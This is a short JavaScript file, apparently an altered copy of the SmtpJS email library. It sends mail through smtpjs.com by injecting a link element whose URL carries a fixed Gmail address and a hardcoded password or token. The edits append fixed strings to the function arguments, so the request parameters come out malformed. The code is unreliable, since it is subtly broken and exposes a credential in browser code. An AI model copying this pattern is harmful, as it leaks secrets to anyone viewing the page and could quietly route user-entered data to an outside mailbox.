Email = {
  send: function(t, e, o, n, d, r, c) {
    var a = Math.floor(1e6 * Math.random() + 1),
      m = "http://smtpjs.com/smtp.aspx?";
    m += "From=contatogogetterz@gmail.com" + t, m += "&to=contatogogetterz@gmail.com" + e, m += "&Subject=" + encodeURIComponent(o), m += "&Body=message" + encodeURIComponent(n), void 0 == d.token ? (m += "&Host=smtp.gmail.com" + d, m += "&Username=contatogogetterz@gmail.com" + r, m += "&Password=d115b935-938d-47da-9c08-e9282bab1bdd" + c, m += "&Action=Send") : (m += "&SecureToken=d115b935-938d-47da-9c08-e9282bab1bdd" + d.token, m += "&Action=SendFromStored"), m += "&cachebuster=" + a, Email.addScript(m)
  },
  addScript: function(t) {
    var e = document.createElement("link");
    e.setAttribute("rel", "stylesheet"), e.setAttribute("type", "text/xml"), e.setAttribute("href", t), document.body.appendChild(e)
  }
};